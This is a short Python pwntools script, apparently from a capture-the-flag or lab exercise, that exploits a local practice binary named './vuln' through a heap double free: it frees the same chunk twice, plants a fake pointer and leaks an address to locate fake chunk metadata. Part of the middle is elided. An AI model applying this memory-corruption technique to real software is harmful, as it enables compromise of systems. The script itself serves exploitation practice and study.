from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()


def create(name='a'):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Name: ', name)

def delete(idx):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Index: ', str(idx))

def complete():
    p.sendlineafter('>> ', '3')
    print(p.recvline())

create('yes')
create('yes')
delete(0)
delete(1)
delete(0)

create(p64(0x08080808))
pause()

p.recvuntil('data: ')
fake_metadata = int(p.recvline(), 16) - 8

log.success('Fake Metadata: ' + hex(fake_metadata))

[...]

create('junk1')
create('junk2')
pause()


